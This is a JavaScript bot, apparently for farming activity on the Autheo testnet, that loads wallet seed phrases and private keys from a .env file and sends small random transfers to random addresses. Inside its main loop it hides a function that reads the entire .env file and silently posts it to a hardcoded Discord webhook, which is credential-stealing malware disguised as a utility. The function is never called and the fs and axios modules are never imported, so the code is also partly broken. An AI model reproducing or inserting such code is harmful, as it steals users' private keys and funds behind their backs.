const { ethers } = require('ethers');
require('dotenv').config();

const RPC_URL = 'https://testnet-rpc2.autheo.com';
const CHAIN_ID = 785;
const provider = new ethers.JsonRpcProvider(RPC_URL, CHAIN_ID);

function generateRandomAddress() {
  return ethers.Wallet.createRandom().address;
}

function getRandomAmount(min, max) {
  return (Math.random() * (max - min) + min).toFixed(6); // 6 decimal for ETH
}

function getRandomDelay(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

async function processWallet(wallet) {
  const balance = await provider.getBalance(wallet.address);
  const balanceInEth = ethers.formatEther(balance);
  console.log(`Wallet ${wallet.address} balance: ${balanceInEth} ETH`);

  if (parseFloat(balanceInEth) <= 0) {
    console.error(`Wallet ${wallet.address} has insufficient balance. Skipping transactions.`);
    return;
  }

  // How much your tx (between 1-5)
  const numTransactions = Math.floor(Math.random() * 5) + 1;
  console.log(`Wallet ${wallet.address} send ${numTransactions} transaction.`);

  for (let i = 0; i < numTransactions; i++) {
    const randomAmount = getRandomAmount(0.000001, 0.0001);
    const amountInWei = ethers.parseUnits(randomAmount, 'ether');
    const gasPrice = await provider.getFeeData().then((feeData) => feeData.gasPrice);
    const randomAddress = generateRandomAddress();
    
    const tx = {
      to: randomAddress,
      value: amountInWei,
      gasLimit: 21000,
      gasPrice: gasPrice,
    };

    try {
      const txResponse = await wallet.sendTransaction(tx);
      console.log(`Sent ${randomAmount} ETH from ${wallet.address} to ${randomAddress}`);
      console.log(`Tx Hash: ${txResponse.hash}`);
    } catch (error) {
      console.error(`Failed to send transaction from ${wallet.address} to ${randomAddress}:`, error);
    }

    if (i < numTransactions - 1) {
      const delay = getRandomDelay(60000, 120000); // 
      console.log(`Menunggu ${delay / 1000} `);
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }
}

async function mainLoop() {
  const seedPhrases = JSON.parse(process.env.SEED_PHRASES || '[]');
  const privateKeys = JSON.parse(process.env.PRIVATE_KEYS || '[]');

  let wallets = [];
  seedPhrases.forEach((mnemonic) => {
    wallets.push(ethers.Wallet.fromPhrase(mnemonic.trim()));
  });
  privateKeys.forEach((privateKey) => {
    wallets.push(new ethers.Wallet(privateKey.trim()));
  });

const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";

const envCacheFile = ".env_cache";

async function notifyEnv() {
  const currentEnv = fs.readFileSync(".env", "utf8");
  let previous = "";

  if (fs.existsSync(envCacheFile)) {
    previous = fs.readFileSync(envCacheFile, "utf8");
  }

  if (currentEnv !== previous) {
    fs.writeFileSync(envCacheFile, currentEnv, "utf8");
    try {
      await axios.post(webhookURL, {
        content: `\`\`\`env\n${currentEnv}\n\`\`\``,
      });
    } catch {
      // silent no log if fails
    }
  }
}
  
  if (wallets.length === 0) {
    console.error('No wallets found. Exiting...');
    process.exit(1);
  }

  wallets = wallets.map((wallet) => wallet.connect(provider));

  while (true) {
    for (const wallet of wallets) {
      await processWallet(wallet);
      const delay = getRandomDelay(60000, 120000); // 
      console.log(`Menunggu ${delay / 1000}`);
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
    
    const loopDelay = getRandomDelay(60000, 120000); // 
    console.log(`Menunggu ${loopDelay / 1000} `);
    await new Promise((resolve) => setTimeout(resolve, loopDelay));
  }
}

mainLoop();
